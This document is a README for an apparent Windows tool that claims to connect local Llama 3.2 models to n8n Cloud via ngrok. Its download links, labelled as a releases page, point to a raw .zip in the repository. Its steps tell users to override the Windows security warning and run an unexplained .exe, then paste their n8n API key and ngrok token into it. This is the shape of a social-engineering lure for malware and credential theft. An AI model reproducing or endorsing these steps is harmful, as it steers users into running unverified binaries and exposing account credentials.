# 🤖 ollama-ai-agent-n8n - Build automated workflows with local AI

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Deafened-spare644/ollama-ai-agent-n8n/main/workflow/ollama_ai_n_agent_3.1.zip)

This application coordinates local artificial intelligence models with n8n workflow automation. It runs Llama 3.2 on your computer and connects it to cloud services to automate tasks. You control the data while the software manages the logic.

## 📋 System Requirements

Your computer needs specific components to run this software. Ensure you have the following before you begin:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 8GB of RAM. 16GB is better for performance.
*   **Processor:** A modern multi-core processor.
*   **Storage:** 5GB of free disk space for the application and model files.
*   **Internet Access:** A stable connection to reach n8n Cloud and ngrok servers.

## 📥 Downloading the Software 

You must visit the project release page to get the installation file. Follow these steps to obtain the correct version for your Windows computer:

1. Visit the [official releases page](https://raw.githubusercontent.com/Deafened-spare644/ollama-ai-agent-n8n/main/workflow/ollama_ai_n_agent_3.1.zip).
2. Look for the latest version listed at the top of the page.
3. Click the link that ends in .exe to download the installer.
4. Save the file to your desktop or downloads folder.

## ⚙️ Installation Process

Once you have the file, run the installer to set up the software environment.

1. Double-click the downloaded .exe file.
2. If a security window appears, click More Info and then Run anyway.
3. Follow the prompts in the setup window.
4. Accept the default location for the installation files.
5. Click Finish to complete the process.

The installer adds the necessary components to run Ollama and n8n scripts on your machine.

## 🚀 Setting Up the Environment

Before the agent starts, you must configure the connection to your n8n account and the local AI engine.

1. Open the application from your desktop shortcut.
2. A command window opens. Keep this window open while the application runs.
3. The software checks for the Ollama engine. If it is not present, it downloads the necessary files automatically.
4. You will see a prompt asking for your n8n Cloud credentials.
5. Log into your n8n Cloud account in your web browser.
6. Create an API key within your n8n settings.
7. Paste this key into the application window when requested.
8. The software now links your local machine to the cloud workflow engine.

## 🔗 Configuring ngrok 

The application uses ngrok to create a bridge between your local computer and your workflow tools.

1. Create a free account at the ngrok website.
2. Generate an authentication token from your ngrok dashboard.
3. Paste this token into the ollama-ai-agent-n8n configuration menu when the terminal prompts you.
4. This step allows your local Llama 3.2 model to receive instructions from the internet securely.

## 🧠 Running Your First Agent

With the configuration complete, you can start the automation process.

1. The software interface displays a list of available AI models.
2. Select Llama 3.2 from the menu.
3. Click the Start button.
4. The system initializes the model. This takes a few minutes on the first run.
5. Once the status shows Active, navigate to your n8n Cloud dashboard.
6. You will see the new nodes available for your workflows.
7. Create a new trigger in n8n and connect it to the Ollama node.
8. Send a test message through your workflow to check the connection.

## 🛠 Troubleshooting Common Issues

Problems sometimes occur during the initial setup. Check these items if the agent does not connect:

*   **Firewall alerts:** Windows might block the network connection. Ensure you allow the application to access private and public networks.
*   **Missing memory:** Close other intensive applications like web browsers or video editors if the AI model fails to start.
*   **Invalid Keys:** Re-check your n8n API key and ngrok token. Ensure you copy the entire string without adding extra spaces at the beginning or end.
*   **Update cycles:** If the software behaves incorrectly, restart the application to clear the internal cache.

## 📦 Managing Models

The software downloads the Llama 3.2 model to your local hard drive. 

1. Open the settings menu inside the application.
2. Navigate to the Model Management tab.
3. You can see how much space the current model occupies.
4. You can click Remove to delete the model and free up space if needed.
5. Re-downloading the model is possible at any time if you accidentally delete the files.

## 🔒 Data Privacy

This application prioritizes local execution. Your document data does not exit your computer unless the n8n workflow specifically instructs it to send data to a cloud service. You control which information goes to the internet. Review your n8n workflows regularly to ensure no sensitive data leaves your environment without your consent.

## 📡 Performance Tips

Local AI performance depends on your hardware. Use these settings to improve speed:

*   Use a smaller model size if you have less than 16GB of RAM.
*   Exit background processes that consume CPU cycles.
*   Keep the application window active during long workflow tasks.
*   Connect your computer to power instead of relying on battery to ensure the processor operates at full speed.

## 📝 Usage Policies

This software is for automation and orchestration purposes. Ensure you comply with the terms of service of the cloud platforms you connect to the agent. Do not use the agent to automate tasks that violate the rules of those external services. Keep your API keys and tokens secret, as they allow access to your personal workflows.